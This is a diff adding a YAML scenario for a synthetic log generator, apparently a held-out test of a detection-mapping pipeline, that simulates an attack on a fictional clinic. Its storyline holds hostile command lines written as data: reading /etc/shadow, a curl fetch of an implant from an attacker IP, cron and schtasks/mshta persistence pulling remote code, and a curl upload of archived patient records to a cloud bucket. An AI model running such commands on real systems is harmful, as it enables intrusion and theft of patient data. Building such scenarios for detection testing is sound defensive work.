@@ -1,0 +1,344 @@
+version: "1.0"
+name: heldout-clinic
+description: |
+  Second held-out generalization scenario. Authored AFTER the manufacturing
+  scenario had already been used to fix narration/acceptance defects, so this
+  is the only bundle the mapping pipeline has never been tuned against. A
+  Linux-first intrusion at a medical clinic: SSH brute force against a
+  patient-portal host, credential access from /etc/shadow, cron persistence,
+  a curl-fetched implant, pivot to a Windows records server with schtasks
+  and mshta, and exfiltration to a cloud bucket.
+
+environment:
+  description: "Outpatient clinic with a Linux patient portal in a DMZ, a Windows records server, a domain controller, and clinical workstations"
+  domain: "meridian-clinic.local"
+
+  timezone:
+    default: "Europe/Warsaw"
+
+  users:
+    - username: agata.nowak
+      full_name: "Agata Nowak"
+      email: "agata.nowak@meridian-clinic.pl"
+      persona: receptionist
+      primary_system: WS-ANOWAK-03
+      groups: ["front-desk"]
+      enabled: true
+      browsing_intensity: normal
+
+    - username: piotr.zielinski
+      full_name: "Piotr Zielinski"
+      email: "piotr.zielinski@meridian-clinic.pl"
+      persona: hr
+      primary_system: WS-PZIEL-03
+      groups: ["hr"]
+      enabled: true
+      browsing_intensity: light
+
+    - username: marek.kowal
+      full_name: "Marek Kowal"
+      email: "marek.kowal@meridian-clinic.pl"
+      persona: sysadmin
+      primary_system: WS-MKOWAL-03
+      groups: ["it", "domain-admins"]
+      enabled: true
+      browsing_intensity: light
+
+    - username: ewa.lis
+      full_name: "Ewa Lis"
+      email: "ewa.lis@meridian-clinic.pl"
+      persona: executive
+      primary_system: WS-ELIS-03
+      groups: ["management"]
+      enabled: true
+      browsing_intensity: normal
+
+  service_accounts:
+    - portal
+    - svc-records
+    - svc-backup-clinic
+
+  stale_accounts:
+    - username: locum.doctor
+      last_active: "2023-12-15"
+      reason: "Temporary physician account left enabled"
+
+  systems:
+    - hostname: WS-ANOWAK-03
+      ip: "10.91.10.41"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: agata.nowak
+      services: ["dns-client"]
+
+    - hostname: WS-PZIEL-03
+      ip: "10.91.10.42"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: piotr.zielinski
+      services: ["dns-client"]
+
+    - hostname: WS-MKOWAL-03
+      ip: "10.91.10.43"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: marek.kowal
+      services: ["dns-client"]
+
+    - hostname: WS-ELIS-03
+      ip: "10.91.10.44"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: ewa.lis
+      services: ["dns-client"]
+
+    - hostname: DC-CLN-01
+      ip: "10.91.20.10"
+      os: "Windows Server 2022"
+      type: domain_controller
+      services: ["kerberos", "ldap", "dns", "windows-dhcp-server"]
+      roles: ["domain_controller", "dns_server", "dhcp_server"]
+
+    - hostname: REC-CLN-01
+      ip: "10.91.20.20"
+      os: "Windows Server 2019"
+      type: server
+      services: ["smb", "dns-client"]
+      roles: ["file_server"]
+
+    - hostname: PORTAL-CLN-01
+      ip: "10.91.30.10"
+      os: "Ubuntu 22.04 LTS"
+      type: server
+      services: ["nginx", "php-fpm", "ssh", "dns-client"]
+      roles: ["web_server"]
+      public_hostnames: ["portal.meridian-clinic.pl"]
+
+  network:
+    public_cidrs:
+      - "185.60.44.0/28"
+
+    segments:
+      - name: workstations
+        cidr: "10.91.10.0/24"
+        description: "Clinical workstation VLAN"
+        exposure: internal
+        systems: [WS-ANOWAK-03, WS-PZIEL-03, WS-MKOWAL-03, WS-ELIS-03]
+
+      - name: servers
+        cidr: "10.91.20.0/24"
+        description: "Internal server VLAN"
+        exposure: internal
+        systems: [DC-CLN-01, REC-CLN-01]
+
+      - name: dmz
+        cidr: "10.91.30.0/24"
+        description: "DMZ with the patient portal"
+        exposure: both
+        external_ratio: 0.7
+        systems: [PORTAL-CLN-01]
+
+    sensors:
+      - type: network
+        name: cln-core-span
+        hostname: ZEEK-CLN-CORE
+        monitoring_segments: [workstations, servers, dmz]
+        direction: bidirectional
+        placement: span
+        log_formats: [zeek]
+        description: "Core switch SPAN"
+
+time_window:
+  start: "2024-11-12T07:00:00Z"
+  duration: "6h"
+  warmup: "2h"
+
+baseline_activity:
+  description: "Normal clinic workday: portal visitors, records access, domain authentication."
+  intensity: medium
+  variation: medium
+  suspicious_noise: medium
+  traffic_rates:
+    web: low
+    user_activity: low
+    persona_connections: low
+
+observation_profile: complete
+logon_grace_period: "45m"
+
+storyline:
+  - id: cln-001
+    time: "+35m"
+    actor: portal
+    system: PORTAL-CLN-01
+    activity: "SSH brute force against the patient portal"
+    events:
+      - type: credential_spray
+        technique: "T1110.001 - Brute Force: Password Guessing"
+        target_accounts: [portal, root]
+        source_ip: "198.51.100.23"
+        interval: "3s"
+        count: 60
+        pattern: brute_force
+        success:
+          account: portal
+          after: 55
+
+  - id: cln-002
+    time: "+45m"
+    actor: portal
+    system: PORTAL-CLN-01
+    activity: "Interactive SSH access and local credential file access"
+    events:
+      - type: ssh_session
+        technique: "T1021.004 - Remote Services: SSH"
+        source_ip: "198.51.100.23"
+      - type: process
+        technique: "T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow"
+        process_name: "/usr/bin/cat"
+        command_line: "cat /etc/shadow"
+      - type: process
+        technique: "T1087.001 - Account Discovery: Local Account"
+        process_name: "/usr/bin/cat"
+        command_line: "cat /etc/passwd"
+      - type: process
+        technique: "T1082 - System Information Discovery"
+        process_name: "/usr/bin/uname"
+        command_line: "uname -a"
+
+  - id: cln-003
+    time: "+58m"
+    actor: portal
+    system: PORTAL-CLN-01
+    activity: "Implant fetched with curl, made executable, and persisted with cron"
+    events:
+      - type: process
+        technique: "T1105 - Ingress Tool Transfer"
+        process_name: "/usr/bin/curl"
+        command_line: "curl -fsSL http://198.51.100.23/static/kworkerd -o /var/tmp/.kworkerd"
+      - type: process
+        technique: "T1222.002 - File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification"
+        process_name: "/usr/bin/chmod"
+        command_line: "chmod +x /var/tmp/.kworkerd"
+      - type: process
+        technique: "T1053.003 - Scheduled Task/Job: Cron"
+        process_name: "/usr/bin/crontab"
+        command_line: "crontab -l | { cat; echo \"*/10 * * * * /var/tmp/.kworkerd\"; } | crontab -"
+
+  - id: cln-004
+    time: "+1h10m"
+    actor: portal
+    system: PORTAL-CLN-01
+    activity: "Implant beacons over HTTPS to attacker infrastructure"
+    events:
+      - type: beacon
+        technique: "T1071.001 - Application Layer Protocol: Web Protocols"
+        dst_ip: "198.51.100.23"
+        dst_port: 443
+        hostname: "cdn-static-assets.org"
+        service: ssl
+        interval: "3m"
+        duration: "40m"
+        action: allow
+
+  - id: cln-005
+    time: "+1h25m"
+    actor: marek.kowal
+    system: REC-CLN-01
+    activity: "Pivot to the Windows records server using the sysadmin's reused password"
+    events:
+      - type: rdp_session
+        technique: "T1021.001 - Remote Services: Remote Desktop Protocol"
+        source_ip: "10.91.30.10"
+      - type: process
+        technique: "T1053.005 - Scheduled Task/Job: Scheduled Task"
+        process_name: "C:\\Windows\\System32\\schtasks.exe"
+        command_line: "schtasks /create /tn \"Windows\\HealthCheck\" /tr \"mshta.exe https://cdn-static-assets.org/h.hta\" /sc hourly /ru SYSTEM /f"
+      - type: process
+        technique: "T1218.005 - System Binary Proxy Execution: Mshta"
+        process_name: "C:\\Windows\\System32\\mshta.exe"
+        command_line: "mshta.exe https://cdn-static-assets.org/h.hta"
+
+  - id: cln-006
+    time: "+1h40m"
+    actor: marek.kowal
+    system: REC-CLN-01
+    activity: "Patient records enumerated and archived"
+    events:
+      - type: process
+        technique: "T1083 - File and Directory Discovery"
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe -NoProfile -Command Get-ChildItem -Recurse D:\\Records\\Patients | Select-Object FullName,Length"
+      - type: process
+        technique: "T1560.001 - Archive Collected Data: Archive via Utility"
+        process_name: "C:\\Program Files\\7-Zip\\7z.exe"
+        command_line: "7z.exe a -p -mhe=on C:\\Users\\Public\\rec.7z D:\\Records\\Patients"
+
+  - id: cln-007
+    time: "+1h55m"
+    actor: marek.kowal
+    system: REC-CLN-01
+    activity: "Archive uploaded to a cloud storage bucket"
+    events:
+      - type: process
+        technique: "T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+        process_name: "C:\\Windows\\System32\\curl.exe"
+        command_line: "curl.exe -T C:\\Users\\Public\\rec.7z https://storage.googleapis.com/mc-sync-2211/rec.7z"
+      - type: connection
+        technique: "T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+        dst_ip: "142.250.74.16"
+        dst_port: 443
+        hostname: "storage.googleapis.com"
+        service: ssl
+        orig_bytes: 48000000
+        resp_bytes: 4096
+
+  - id: cln-008
+    time: "+2h5m"
+    actor: marek.kowal
+    system: DC-CLN-01
+    activity: "Domain admin password changed to lock out defenders"
+    events:
+      - type: logon
+        technique: "T1078.002 - Valid Accounts: Domain Accounts"
+        logon_type: 3
+        source_ip: "10.91.20.20"
+      - type: process
+        technique: "T1531 - Account Access Removal"
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net user marek.kowal Kz!9r2#Lq /domain"
+
+red_herrings:
+  - id: cln-rh-001
+    time: "+3h"
+    actor: marek.kowal
+    system: REC-CLN-01
+    activity: "Sysadmin runs the monthly records archive job"
+    explanation: "Routine compliance archive of closed records to the backup share"
+    events:
+      - type: process
+        process_name: "C:\\Program Files\\7-Zip\\7z.exe"
+        command_line: "7z.exe a \\\\REC-CLN-01\\Backups\\archive-2024-10.7z D:\\Records\\Closed\\2024-10"
+
+  - id: cln-rh-002
+    time: "+3h15m"
+    actor: portal
+    system: PORTAL-CLN-01
+    activity: "Portal maintenance: package list refresh and log rotation"
+    explanation: "Scheduled maintenance run by the web service account"
+    events:
+      - type: process
+        process_name: "/usr/bin/apt-get"
+        command_line: "apt-get update"
+      - type: process
+        process_name: "/usr/sbin/logrotate"
+        command_line: "logrotate /etc/logrotate.conf"
+
+output:
+  logs:
+    - format: windows
+    - format: ecar
+    - format: zeek
+    - format: syslog
+  destination: scenarios/heldout-clinic
+  compression: false
